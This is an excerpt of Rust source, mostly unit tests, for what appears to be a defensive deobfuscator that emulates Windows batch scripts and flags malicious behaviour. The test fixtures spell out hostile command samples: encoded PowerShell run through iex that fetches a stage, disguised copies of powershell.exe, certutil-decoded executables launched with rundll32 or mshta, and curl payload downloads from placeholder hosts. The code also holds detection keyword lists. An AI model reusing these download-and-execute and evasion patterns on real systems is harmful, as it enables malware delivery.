...
use crate::util::{snippet_prefix, starts_with_ascii_case_insensitive};
...
mod line_reader_tests {
    ...
    #[test]
    fn escaped_trailing_caret_does_not_join_next_line() {
        let input = b"echo ^^\necho second\n";
        assert_eq!(
            read_logical_lines(input),
            vec!["echo ^^".to_string(), "echo second".to_string()]
        );
    }
...
mod lex_type_tests {
    ...
    fn percent_tilde_flags_parse() {
        ...
        assert!(!f.f);
        let mixed = PercentTildeFlags::parse("DpNx").expect("parse mixed");
        assert!(mixed.d && mixed.p && mixed.n && mixed.x);
        assert_eq!(PercentTildeFlags::parse("dpq"), None);
    }
...
mod interp_tests {
    ...
    #[test]
    fn script_host_extension_detects_mixed_case_paths() {
        assert_eq!(
            crate::interp::script_host_extension(r#"C:\Temp\Foo.VbS"#),
            Some("vbs")
        );
        assert_eq!(
            crate::interp::script_host_extension(r#"C:\Temp\Foo.HtA"#),
            Some("hta")
        );
        assert_eq!(
...
mod analyze_tests {
    ...
    #[test]
    fn rem_comment_line_is_ignored_case_insensitively() {
        let report = analyze(b"ReM comment\r\necho after\r\n", &Config::default());
        assert!(
            report.deobfuscated.contains("echo after"),
            "comment gate blocked following line: {:?}",
            report.deobfuscated
        );
    }
    ...
    #[test]
    fn polyglot_script_block_is_scanned_case_insensitively() {
        let mut env = Environment::new(&Config::default());
        ...
        assert!(
            env.all_extracted_jscript
                .iter()
                .any(|js| js.windows(8).any(|w| w.eq_ignore_ascii_case(b"alert(1)"))),
            "mixed-case script block not extracted: {:?}",
            env.all_extracted_jscript
        );
    }
    ...
    #[test]
    fn analyze_scans_powershell_copied_to_disguised_exe() {
        use base64::Engine;

        let payload = "Invoke-WebRequest -Uri https://copied-ps.example/stage";
        let b64 = base64::engine::general_purpose::STANDARD.encode(payload.as_bytes());
        let script = format!(
            "copy C:\\Windows\\System32\\WindowsPowerShell\\v1.0\\powershell.exe \"%~0.exe\" /y\r\n\
             \"%~0.exe\" [Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('{b64}')) | iex\r\n",
        );
        let report = analyze(script.as_bytes(), &Config::default());
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://copied-ps.example/stage"
            )
        });
        assert!(
            has,
            "copied powershell alias payload was not scanned: {:?}",
            report.traits
        );
        assert!(
            report
                ...
                .iter()
                .any(|ps| ps.contains("copied-ps.example/stage")),
            "copied powershell alias body was not extracted as ps1: {:?}",
            report.extracted_ps1_normalized
        );
    }

    #[test]
    fn analyze_scans_xcopy_powershell_alias_encoded_command() {
        use base64::Engine;

        let payload = "Invoke-WebRequest -Uri https://xcopy-copied-ps.example/stage";
        ...
        let has = report.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, .. } if src == "https://xcopy-copied-ps.example/stage"
            )
        });
        assert!(
            has,
            "xcopy copied powershell alias payload was not scanned: {:?}",
            report.traits
        );
        assert!(
            report
...
mod echo_tests {
    ...
    fn echo_single_quoted_redirect_target_records_content() {
        ...
        let entry = env
            .modified_filesystem
            .get("payload.txt")
            .expect("single-quoted echo target not recorded");
        match entry {
    ...
    fn block_echo_payload_accepts_punctuation_after_echo() {
        ...
        assert_eq!(crate::block_echo_payload("echo.hello"), Some("hello"));
        assert_eq!(crate::block_echo_payload("echo hello"), Some("hello"));
        assert_eq!(crate::block_echo_payload("echo"), Some(""));
        assert_eq!(crate::block_echo_payload("echo%X"), None);
    }
    ...
    fn extracted_powershell_payload_surfaced_with_banner() {
        ...
        use base64::Engine;
        let body = "InVoKe-WebReQuEsT -UrI https://hidden.example/p";
        let encoded = base64::engine::general_purpose::STANDARD.encode(body.as_bytes());
        let script = format!(
            "@echo off\r\npowershell -Command \"$x='{}'; $y=[System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($x)); Invoke-Expression $y\"\r\n",
            encoded
        );
        let report = analyze(script.as_bytes(), &AnalyzeConfig::default());
    ...
    #[test]
    fn quoted_script_extension_pushes_implicit_host_trait() {
        let mut env = Environment::new(&Config::default());
        crate::interp::interpret_line(r#""C:\Temp\foo.vbs""#, &mut env);
        assert!(
...
runas /user:Administrator "cmd.exe /c curl -K curl.cfg -o payload.exe""#;
    ...
    fn remote_exec_mixed_case_tokens_emit_trait() {
        ...
        assert!(
            report.traits.iter().any(|t| matches!(
                t,
                Trait::RemoteExec { tool, .. } if tool == "winrm"
            )),
            "mixed-case winrm remote exec not detected: {:?}",
            report.traits
        );

        let script2 = b"@echo off\r\nInVoKe-WmIMeThOd -ComputerName 10.0.0.6\r\n";
        let report2 = analyze(script2, &AnalyzeConfig::default());
        assert!(
            report2.traits.iter().any(|t| matches!(
                t,
                Trait::RemoteExec { tool, target_host } if tool == "Invoke-WmiMethod" && target_host == "10.0.0.6"
            )),
            "mixed-case Invoke-WmiMethod remote exec not detected: {:?}",
            report2.traits
        );
    }
...
"#;
    ...
    #[test]
    fn defender_action_suffix_classifier_normalizes_mixed_case() {
        assert_eq!(
            crate::deob_scan::defender_evasion_action_suffix("DisAbLeReAlTiMeMoNiToRiNg"),
            Some("disablerealtimemonitoring")
        );
        assert_eq!(
            crate::deob_scan::defender_evasion_action_suffix("MAPSReporting"),
            Some("mapsreporting")
        );
        assert_eq!(
            crate::deob_scan::defender_evasion_action_suffix("unknown"),
            None
        );
    }

    #[test]
    fn defender_label_classifier_normalizes_mixed_case() {
        assert_eq!(
            crate::deob_scan::defender_evasion_label("PaTh"),
            Some("path")
        );
        assert_eq!(
            crate::deob_scan::defender_evasion_label("StOp"),
            Some("stop")
        );
        assert_eq!(
            crate::deob_scan::defender_evasion_label("delete"),
            Some("delete")
        );
        assert_eq!(crate::deob_scan::defender_evasion_label("bogus"), None);
    }

    #[test]
    fn copied_alias_matcher_accepts_mixed_case_and_trailing_dot_basename() {
        let mut aliases = std::collections::HashSet::new();
        aliases.insert("vjik.exe".to_string());
        assert!(crate::deob_scan::copied_alias_matches_command_ci(
            &aliases,
            r#"VJIK.EXE."#
        ));
        assert!(crate::deob_scan::copied_alias_matches_command_ci(
    ...
    #[test]
    fn copied_curl_alias_mixed_case_output_flag_emits_structured_download() {
        ...
        crate::deob_scan::scan_deob_text(
            r#"vjik -k https://curl-copy.example/payload.bin --OuTpUt C:\Temp\payload.bin"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst, .. }
                    if src == "https://curl-copy.example/payload.bin"
                        && dst.as_deref() == Some("C:\\Temp\\payload.bin")
            )
        });
        assert!(
            has,
            "no structured Download from copied curl alias mixed-case output flag: {:?}",
            env.traits
        );
    }
...
"#;
    ...
    #[test]
    fn leading_comma_prefix_set_is_dispatched() {
        let script = b"@,@@set \"deob_x=https://comma.example/p\"\r\necho %deob_x%\r\n";
        let report = analyze(script, &AnalyzeConfig::default());
        assert!(
            report.deobfuscated.contains("https://comma.example/p"),
            "leading-`,` set not dispatched: {:?}",
            report.deobfuscated
        );
    }
    ...
    #[test]
    fn set_a_wraps_large_intermediate_to_i32() {
        let mut env = Environment::new(&Config::default());
        interpret_line("set /a X=2147483648", &mut env);
        assert_eq!(env.get("x").as_deref(), Some("-2147483648"));
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Arithmetic { value, .. } if *value == -2147483648
            )
        });
        assert!(has, "no wrapped Arithmetic trait: {:?}", env.traits);
    }
...
start payload.hta"#,
        ...
        for expected_cmd in ["explorer payload.hta", "start payload.hta"] {
            assert!(
                report.traits.iter().any(|t| {
                    matches!(
                        t,
                        Trait::UrlArgument { cmd, url }
                            if cmd == expected_cmd
                                && url == "https://local-provenance.example/payload.hta"
                    )
                }),
                "{expected_cmd} UrlArgument was deduplicated or missing: {:?}",
                report.traits
            );
        }
    }
...
mod labels_tests {
    ...
    #[test]
    fn label_with_tab_separated_suffix_uses_first_word() {
        let lines = vec![":tabbed\tmore text".to_string()];
        let idx = build_label_index(&lines);
        assert_eq!(idx.get("tabbed"), Some(&0));
    }
}
...
mod for_f_misc_tests {
    ...
    #[test]
    fn for_f_tokens_star_suffix_preserves_remainder_column() {
        let script =
            br#"for /f "tokens=1* delims= " %%a in ("first second third") do echo got=%%a|%%b"#;
        let report = analyze(script, &Config::default());
        assert!(
...
echo https://for-f-find-file.example/payload.exe>>web.txt
for /f "tokens=* delims=" %%U in ('find "https://" web.txt') do curl -o payload.exe %%U"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst: Some(dst), .. }
                        if src == "https://for-f-find-file.example/payload.exe"
                            && dst == "payload.exe"
                )
            }),
            "FOR /F find file source did not feed later curl: {:?}\n{}",
            report.traits,
            report.deobfuscated
        );
    }
...
echo https://for-f-sort-file.example/payload.exe>>urls.txt
for /f "tokens=* delims=" %%U in ('sort urls.txt ^| find "https://"') do curl -o payload.exe %%U"#,
            &Config::default(),
        );
        assert!(
            report.traits.iter().any(|t| {
                matches!(
                    t,
                    Trait::Download { src, dst: Some(dst), .. }
                        if src == "https://for-f-sort-file.example/payload.exe"
                            && dst == "payload.exe"
                )
            }),
...
fn pre_scan_polyglot_script_block(input: &[u8], env: &mut Environment) {
    ...
    while let Some(abs_open) = crate::util::find_ascii_case_insensitive_from(&text, "<script", idx)
    {
        ...
        let Some(close_rel) =
            crate::util::find_ascii_case_insensitive_from(&text, "</script>", body_start)
        else {
            break;
        };
...
fn decode_utf16le_script_blob(input: &[u8]) -> Option<String> {
    ...
    let looks_script = crate::util::contains_ascii_case_insensitive(&decoded, "createobject")
        || crate::util::contains_ascii_case_insensitive(&decoded, "wscript")
        || crate::util::contains_ascii_case_insensitive(&decoded, "xmlhttp")
        || crate::util::contains_ascii_case_insensitive(&decoded, "private function")
        || crate::util::contains_ascii_case_insensitive(&decoded, "option explicit")
...
/// caller's real input name, which is important for self-extracting
/// `certutil -decode` chains that refer to the current script by basename.
...
fn summarize_multiline_base64_pe_carrier_blocks(text: String, env: &mut Environment) -> String {
    ...
    for line in text.lines() {
        ...
        let is_base64_line = !trimmed.is_empty() && trimmed.bytes().all(is_base64_carrier_byte);
...
fn flush_base64_pe_block(out: &mut String, block: &mut Vec<&str>, env: &mut Environment) -> bool {
    ...
    if total_len >= 4096 {
        ...
        let kind = decoded
            .as_ref()
            .map(|(label_kind, _)| base64_pe_carrier_kind_from_label(label_kind))
            .or_else(|| classify_base64_pe_block(block));
        match kind {
            Some(Base64PeCarrierKind::DirectPe) => {
            ...
            Some(Base64PeCarrierKind::HexPe) => {
                if let Some((label_kind, pe)) = decoded {
                    push_recovered_pe_artifact(env, label_kind, pe);
                }
                out.push_str(&format!(
...
enum Base64PeCarrierKind {
    DirectPe,
    HexPe,
}

fn base64_pe_carrier_kind_from_label(label_kind: &str) -> Base64PeCarrierKind {
    if label_kind == "embedded-base64-hex-pe" {
        Base64PeCarrierKind::HexPe
    } else {
        Base64PeCarrierKind::DirectPe
    }
}

fn classify_base64_pe_block(block: &[&str]) -> Option<Base64PeCarrierKind> {
    use base64::Engine;

    let mut prefix = String::new();
    for line in block {
        let need = 64usize.saturating_sub(prefix.len());
        if need == 0 {
            break;
        }
    ...
    if decoded.starts_with(b"MZ") {
        return Some(Base64PeCarrierKind::DirectPe);
    }
    if decoded
        .get(..4)
        .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
    {
        return Some(Base64PeCarrierKind::HexPe);
    }
    None
}
...
fn collect_ps1_self_tail_reversed_gzip_pe(
    ...
    for marker in ps1_self_read_split_markers(normalized_ps1) {
        ...
        for line in raw_text.lines() {
            ...
            b64.extend(
                after_marker
                    .chars()
                    .take_while(|ch| ch.is_ascii() && is_base64_carrier_byte(*ch as u8)),
            );
        }
    ...
    let tail_loader = normalized_ps1
        .iter()
        .any(|ps| crate::util::contains_ascii_case_insensitive(ps, "select-object -last 1"));
    if !tail_loader {
        return;
    }
...
fn ps1_self_read_split_markers(normalized_ps1: &[String]) -> Vec<String> {
    ...
    for ps in normalized_ps1 {
        if !crate::util::contains_ascii_case_insensitive(ps, "readlines")
            || !crate::util::contains_ascii_case_insensitive(ps, ".split")
        {
            continue;
        }
...
fn reversed_gzip_pe_from_base64(b64: &str) -> Option<Vec<u8>> {
    ...
    if !b64.bytes().all(is_base64_carrier_byte) {
        return None;
    }
...
fn flush_embedded_base64_pe_artifact_block(
    ...
    let Some((label_kind, pe)) = decode_base64_pe_carrier_block(block) else {
        block.clear();
        return 0;
    };
    block.clear();

    if push_recovered_pe_artifact(env, label_kind, pe) {
        1
    } else {
        0
    }
...
fn push_recovered_pe_artifact(env: &mut Environment, label_kind: &str, pe: Vec<u8>) -> bool {
    if env.recovered_pe.iter().any(|(_, existing)| existing == &pe) {
        return false;
    }
    ...
    let index = env
        ...
        .count()
        + 1;
    let label = format!("{label_kind}-{index}");
...
fn decode_base64_pe_carrier_block(block: &[&str]) -> Option<(&'static str, Vec<u8>)> {
        ...
        .is_some_and(|head| head.eq_ignore_ascii_case(b"4d5a"))
    {
        ...
        if pe.starts_with(b"MZ") {
            return Some(("embedded-base64-hex-pe", pe));
        }
    }
    None
}
...
fn collect_decoded_pe_artifacts(env: &mut Environment) {
    ...
    let mut entries: Vec<(String, Vec<u8>)> = env
        .modified_filesystem
        .iter()
        .filter_map(|(path, entry)| match entry {
            crate::env::FsEntry::Decoded { content, .. } if content.starts_with(b"MZ") => {
    ...
    let mut decoded_added = 0usize;
    for (path, content) in entries {
        if decoded_added >= MAX_DECODED_PE_ARTIFACTS {
            break;
        }
        if env
            .recovered_pe
        ...
        let safe_name: String = basename
            ...
            .take(64)
            .collect();
        let label = format!("certutil-decoded-{safe_name}");
        env.recovered_pe.push((label, content));
        decoded_added += 1;
    }
}
...
fn collect_recovered_artifact_utf16le_strings(
    ...
    for pair in blob[offset..].chunks_exact(2) {
        ...
        if ch == u16::from(b'\t') || (0x20..=0x7e).contains(&(ch as u8)) && ch <= 0x7e {
            run.push(ch as u8);
            if run.len() >= MAX_LEN {
                push_recovered_artifact_string(&mut run, strings, max_strings, MIN_LEN);
            }
...
fn recovered_artifact_string_is_behavior_hint(s: &str) -> bool {
    ...
    NEEDLES
        .iter()
        .any(|needle| crate::util::contains_ascii_case_insensitive(s, needle))
}
...
fn is_block_set_line(line: &str) -> bool {
    starts_with_ascii_case_insensitive(line, "set ")
        || starts_with_ascii_case_insensitive(line, "set\t")
        || starts_with_ascii_case_insensitive(line, "set\"")
}

fn block_echo_payload(body: &str) -> Option<&str> {
    let rest = body.strip_prefix("echo").or_else(|| {
        if starts_with_ascii_case_insensitive(body, "echo") {
            Some(&body["echo".len()..])
        } else {
            None
        }
        ...
        for (dst, content) in candidates {
            ...
            let self_iex = {
                (crate::util::contains_ascii_case_insensitive(&decoded_text, "readalltext")
                    ...
                    && (crate::util::contains_ascii_case_insensitive(&decoded_text, "%~f0")
                        || crate::util::contains_ascii_case_insensitive(&decoded_text, "%~dpnx0")
                        || crate::util::contains_ascii_case_insensitive(&decoded_text, "%~dp0"))
                    && (crate::util::contains_ascii_case_insensitive(&decoded_text, "iex")
                        || crate::util::contains_ascii_case_insensitive(
                            &decoded_text,
                            "invoke-expression",
                        ))
            };
...
fn summarize_base64_pe_carrier_line(line: &str) -> Option<String> {
    ...
    let prefix_len = 16.min(trimmed.len() - (trimmed.len() % 4));
    if prefix_len < 4 {
        return None;
    }
...
fn rescue_truncated_urls(tail: &str, full_len: usize, env: &mut Environment) {
    ...
    for caps in URL_RE.captures_iter(tail) {
        ...
        let url = crate::deob_scan::trim_url_suffix(m.as_str())
            .trim_end_matches(['.', ':', '!', '?', '\\']);
...
mod line_cap_tests {
    ...
    #[test]
    fn truncated_line_url_trailing_punctuation_is_rescued_direct() {
        use crate::env::Environment;
        let mut env = Environment::new(&Config::default());
        let tail = " then https://malware-c2.attacker-domain.org/payload.bat), continues";
        crate::rescue_truncated_urls(tail, 200_000, &mut env);
        ...
        assert!(
            rescued,
            "punctuated URL in tail should be rescued; traits: {:?}",
            env.traits
        );
    }
    ...
    #[test]
    fn certutil_decoded_pe_is_exported_as_recovered_payload() {
        use base64::Engine;
        ...
        assert!(
            ...
            "certutil-decoded PE was not exported: {:?}",
            report
                .recovered_pe
                .iter()
    ...
    #[test]
    fn certutil_decoded_pe_export_has_own_quota() {
        use crate::env::{DecodeKind, Environment, FsEntry};

        let mut env = Environment::new(&Config::default());
        for i in 0..16 {
            env.recovered_pe.push((format!("other-{i}"), vec![i as u8]));
        }
        let mut pe = b"MZ\x90\x00".to_vec();
        pe.resize(1024, 0);
        env.modified_filesystem.insert(
            ...
            FsEntry::Decoded {
                content: pe.clone(),
                src: "payload.b64".to_string(),
                method: DecodeKind::Base64,
            },
        );
        ...
        assert!(
            env.recovered_pe
                .iter()
                .any(|(label, blob)| label.contains("certutil-decoded-payload.dll") && blob == &pe),
            "certutil decoded PE was skipped because other recovered blobs filled the global quota: {:?}",
            env.recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
                .collect::<Vec<_>>()
    ...
    fn certutil_decode_self_basename_resolves_with_input_path() {
        ...
        assert!(
            ...
            "self-basename certutil decode did not resolve: {:?}",
            report.traits
        );
        assert!(
            report
    ...
    #[test]
    fn multiline_pe_base64_carrier_block_is_summarized() {
        use base64::Engine;
        ...
        assert!(
            !report.deobfuscated.contains(&b64[..256]),
            "raw multiline PE base64 carrier leaked into deob output"
        );
        let tail = b64
            .as_bytes()
            .rchunks(256)
            ...
            .expect("ascii");
        assert!(
            !report.deobfuscated.lines().any(|line| line.trim() == tail),
            "short final base64 carrier line leaked into deob output"
        );
        assert!(
            report
                .recovered_pe
            ...
            "summarized multiline PE carrier was not exported: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
    ...
    #[test]
    fn multiline_base64_hex_pe_carrier_block_is_summarized() {
        use base64::Engine;

        let mut pe = b"MZ\x90\x00".to_vec();
        pe.resize(12_288, 0);
        let hex = hex::encode(&pe);
        let b64_hex = base64::engine::general_purpose::STANDARD.encode(hex);
        let wrapped = b64_hex
            .as_bytes()
            .chunks(64)
            .map(|chunk| std::str::from_utf8(chunk).expect("ascii"))
            ...
            .join("\r\n");
        let script = format!(
            "certutil -decodehex -f source.hex payload.dll\r\n{wrapped}\r\nrundll32 payload.dll,x\r\n"
        );
        let report = analyze(script.as_bytes(), &Config::default());
        ...
        assert!(
            !report.deobfuscated.contains(&b64_hex[..256]),
            "raw base64-hex PE carrier leaked into deob output"
        );
        assert!(
            report
                .recovered_pe
            ...
            "summarized base64-hex PE carrier was not exported: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
    ...
    #[test]
    fn pem_wrapped_pe_base64_carrier_block_is_summarized() {
        use base64::Engine;
        ...
        let wrapped = b64
            ...
            .join("\r\n");
        let script = format!(
            "certutil -decode -f script.bat payload.exe\r\n-----BEGIN CERTIFICATE-----\r\n{wrapped}\r\n-----END CERTIFICATE-----\r\n"
        );
        let report = analyze(script.as_bytes(), &Config::default());
        ...
        assert!(
            !report.deobfuscated.contains(&b64[..256]),
            "raw PEM PE carrier leaked into deob output"
        );
        let tail = b64
            .as_bytes()
            .rchunks(64)
        ...
        assert!(
            !report.deobfuscated.lines().any(|line| line.trim() == tail),
            "short final PEM base64 carrier line leaked into deob output"
        );
        assert!(
            report
                .recovered_pe
                .iter()
                .any(|(label, blob)| label.contains("embedded-base64-pe") && blob == &pe),
            "summarized PEM PE carrier was not exported: {:?}",
            report
                .recovered_pe
                .iter()
                .map(|(label, blob)| (label.as_str(), blob.len()))
...
fn is_label_or_comment_line(line: &str) -> bool {
    ...
    starts_with_ascii_case_insensitive(trimmed, "rem ") || trimmed.eq_ignore_ascii_case("rem")
}
...
mod arith_tests {
    ...
    #[test]
    fn set_case_insensitive_prefix_basic() {
        let env = one("sEt X=7");
        assert_eq!(env.get("x").as_deref(), Some("7"));
    }
...
mod if_tests {
    ...
    #[test]
    fn if_single_quoted_string_eq_runs_body() {
        let script = b"if 'a'=='a' echo match\r\n";
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo match"),
    ...
    #[test]
    fn if_string_eq_allows_paren_inside_quoted_operands() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"if /i "A)" EQU "a)" echo match>out.txt"#, &mut env);
        assert!(
            env.modified_filesystem.contains_key("out.txt"),
            "body did not execute for quoted operands with parens: {:?}",
            env.modified_filesystem.keys().collect::<Vec<_>>()
        );
    }
    ...
    fn if_exist_with_quoted_path_containing_spaces_runs_body() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "c:\\program files\\payload.txt".to_string(),
            FsEntry::Content {
        ...
        interpret_line(
            r#"If ExIsT "C:\Program Files\payload.txt" echo match>out.txt"#,
            &mut env,
        );
        assert!(
            env.modified_filesystem.contains_key("out.txt"),
            "body did not execute for quoted path with spaces: {:?}",
            env.modified_filesystem.keys().collect::<Vec<_>>()
        );
    }
...
"#;
    ...
    #[test]
    fn del_slash_equivalent_file_removes_tracked_file_for_later_if_not_exist() {
        let script = br#"echo marker>C:\Temp\gate.txt
del C:/Temp/gate.txt
...
"#;
        ...
        assert!(
            report.deobfuscated.contains("echo deleted"),
            "del slash-equivalent file did not update tracked file state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
    ...
    #[test]
    fn if_exist_directory_wildcard_resolves_tracked_file() {
        let script = br#"echo marker>C:\Temp\gate.txt
if exist C:\Temp\*.txt set MARK=found
echo %MARK%
"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo found"),
            "if exist wildcard did not resolve tracked file:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
    ...
    #[test]
    fn del_directory_wildcard_removes_tracked_file_for_later_if_not_exist() {
        let script = br#"echo marker>C:\Temp\gate.txt
del /f /q C:\Temp\*.*
if not exist C:\Temp\gate.txt set MARK=deleted
echo %MARK%
"#;
        ...
        assert!(
            report.deobfuscated.contains("echo deleted"),
            "del directory wildcard did not update tracked file state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
    ...
    #[test]
    fn del_current_dir_wildcard_removes_tracked_file_for_later_if_not_exist() {
        let script = br#"echo marker>gate.txt
del /f /q .\*.*
if not exist gate.txt set MARK=deleted
echo %MARK%
...
"#;
        ...
        assert!(
            report.deobfuscated.contains("echo deleted"),
            "del current-dir nested path did not update tracked file state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
        ...
        assert!(
            report.deobfuscated.contains("echo deleted"),
            "del current-dir nested wildcard did not update tracked file state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
    ...
    #[test]
    fn del_current_dir_nested_file_wildcard_removes_tracked_file_for_later_if_not_exist() {
        let script =
            br#"curl -o .\Temp\gate.txt https://nested-current-dir-file-wildcard.example/gate.txt
del .\Temp\*.txt
if not exist Temp\gate.txt set MARK=deleted
echo %MARK%
"#;
        ...
        assert!(
            report.deobfuscated.contains("echo deleted"),
            "del current-dir nested file wildcard did not update tracked file state for if exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
        ...
        assert!(
            ...
            "rmdir did not update tracked directory state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
"#;
    ...
    #[test]
    fn rmdir_current_dir_path_removes_tracked_directory_contents_for_later_if_not_exist() {
        let script = br#"echo marker>Temp\gate.txt
rmdir /s /q .\Temp
if not exist Temp\gate.txt set MARK=removed
echo %MARK%
"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo removed"),
            "rmdir current-dir path did not update tracked directory state for if not exist:\n{}\ntraits={:?}",
            report.deobfuscated,
            report.traits
        );
    }
...
mod call_label_tests {
    ...
    #[test]
    fn call_label_preserves_quoted_positional_args() {
        let script =
            b"call :sub \"hi there\" tail\r\ngoto :eof\r\n:sub\r\necho %1|%2\r\ngoto :eof\r\n";
        let report = analyze(script, &Config::default());
        assert!(
...
mod curl_tests {
    ...
    #[test]
    fn curl_with_mixed_case_output_colon_records_download_destination() {
        let mut env = Environment::new(&Config::default());
        interpret_line("curl --OuTpUt:out.exe http://x/y.exe", &mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, dst: Some(d), .. } if src == "http://x/y.exe" && d == "out.exe"
    ...
    #[test]
    fn curl_with_mixed_case_output_flag_records_download_destination() {
        let mut env = Environment::new(&Config::default());
        interpret_line("curl --OuTpUt out.exe http://x/y.exe", &mut env);
        let has = env.traits.iter().any(|t| matches!(t,
            Trait::Download { src, dst: Some(d), .. } if src == "http://x/y.exe" && d == "out.exe"
        ...
        let has = env.traits.iter().any(|t| {
            matches!(t,
                Trait::Download { src, dst: Some(d), .. }
                    if src == "http://x/foo.exe" && d == "foo.exe"
            )
        });
        assert!(has, "traits: {:?}", env.traits);
        assert!(env.modified_filesystem.contains_key("foo.exe"));
    }

    #[test]
    fn curl_with_remote_name_and_output_dir_uses_resolved_basename() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
...
mshta C:/Temp/payload.hta"#,
    ...
    #[test]
    fn curl_mixed_case_data_payload_does_not_become_download_src() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"curl --OuTpUt NUL --DaTa "http://payload.example/not-download" https://discord.com/api/webhooks/abc"#,
            &mut env,
        );
        let downloads: Vec<_> = env
            .traits
...
explorer .\payload.hta"#,
    ...
    #[test]
    fn explorer_current_dir_nested_target_does_not_use_unrelated_basename_download() {
        let report = crate::analyze(
            br#"curl -o D:\Other\payload.hta https://explorer-current-dir-wrong-basename.example/payload.hta
                ...
                matches!(
                    ...
                    Trait::UrlArgument { cmd, url }
                        if cmd == r#"explorer .\Temp\payload.hta"#
                            && url == "https://explorer-current-dir-wrong-basename.example/payload.hta"
                )
            }),
            "Explorer current-dir nested target reused unrelated basename download: {:?}",
            report.traits
        );
    }
...
rundll32 url.dll,FileProtocolHandler .\Temp\payload.hta"#,
    ...
    #[test]
    fn rundll32_quoted_dll_with_spaces_surfaces_url() {
        let mut env = Environment::new(&Config::default());
        env.modified_filesystem.insert(
            "c:\\program files\\payload.dll".to_string(),
            crate::env::FsEntry::Download {
                src: "https://example.com/payload.dll".to_string(),
            },
        );
        interpret_line(
            r#"rundll32 "C:\Program Files\payload.dll",EntryPoint"#,
            &mut env,
        );
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::Rundll32 { url: Some(url), .. } if url == "https://example.com/payload.dll"
            )
        });
        assert!(
            has,
            "quoted rundll32 dll path did not resolve: {:?}",
            env.traits
        );
    }
    ...
    fn copy_system32_tracked() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"CoPy /Y C:\Windows\System32\Calc.EXE C:\Users\Public\evil.exe"#,
            &mut env,
        );
        assert!(env
            .traits
    ...
    #[test]
    fn xcopy_single_quoted_system32_tracked() {
        let mut env = Environment::new(&Config::default());
        interpret_line(
            r#"xcopy 'C:\windows\system32\calc.exe' 'C:\Users\Public\evil.exe'"#,
            &mut env,
        );
        assert!(env
            .traits
    ...
    #[test]
    fn net_use_quoted_share_with_spaces_records() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"net use Z: "\\evil\share name" /user:adm pass"#, &mut env);
        let has = env.traits.iter().any(|t| {
            matches!(
                t,
                Trait::NetUse { info, .. }
                if info.devicename.as_deref() == Some("Z:")
                    && info.server.as_deref() == Some(r#"\\evil\share name"#)
    ...
    #[test]
    fn net_use_equals_bound_user_value_preserves_user_and_password() {
        let mut env = Environment::new(&Config::default());
        interpret_line(r#"net use Z: \\evil\share /user=DOMAIN\adm pass"#, &mut env);
        ...
        assert!(
            ...
            "equals-bound /user value was not preserved: {:?}",
            env.traits
        );
    }
...
#[cfg(test)]
mod for_f_tests {
    use crate::env::{Config as EnvConfig, Environment, FsEntry};
    use crate::{analyze, Config};
    ...
    #[test]
    fn for_f_usebackq_single_quoted_literal_stays_literal() {
        let script = br#"for /F "usebackq tokens=*" %%A in ('hello world') do echo got=%%A"#;
        let report = analyze(script, &Config::default());
        assert!(
            report.deobfuscated.contains("echo got=hello world"),
            "got:\n{}",
    ...
    #[test]
    fn for_f_usebackq_double_quoted_file_path_reads_file() {
        let mut env = Environment::new(&EnvConfig::default());
        env.modified_filesystem.insert(
            "c:\\temp\\sample.txt".to_string(),
            FsEntry::Content {
                content: b"alpha\r\nbeta\r\n".to_vec(),
                append: false,
            },
        );
        let handled = crate::handlers::for_cmd::run_for_from_raw(
            r#"for /F "usebackq tokens=*" %%A in ("C:\Temp\Sample.txt") do echo got=%%A"#,
            &mut env,
        );
        assert!(handled, "for /F usebackq file source was not handled");
        assert!(
            env.iter_output.contains("echo got=alpha") && env.iter_output.contains("echo got=beta"),
            "got:\n{}",
            env.iter_output
        );
    }
    ...
    #[test]
    fn for_f_usebackq_backtick_command_runs_pipeline() {
        let mut env = Environment::new(&EnvConfig::default());
        env.set("FOO", "BAR");
        let handled = crate::handlers::for_cmd::run_for_from_raw(
            r#"for /F "usebackq delims==" %%A in (`set FOO`) do echo got=%%A"#,
            &mut env,
        );
        assert!(handled, "for /F usebackq backtick source was not handled");
        assert!(
            env.iter_output.contains("echo got=foo"),
            "got:\n{}",
            env.iter_output
        );
    }
    ...
    #[test]
    fn for_f_backticks_without_usebackq_do_not_run_pipeline() {
        let mut env = Environment::new(&EnvConfig::default());
        let handled = crate::handlers::for_cmd::run_for_from_raw(
            r#"for /F "delims=*" %%A in (`echo hello`) do echo got=%%A"#,
            &mut env,
        );
        assert!(handled, "for /F backtick source should still parse");
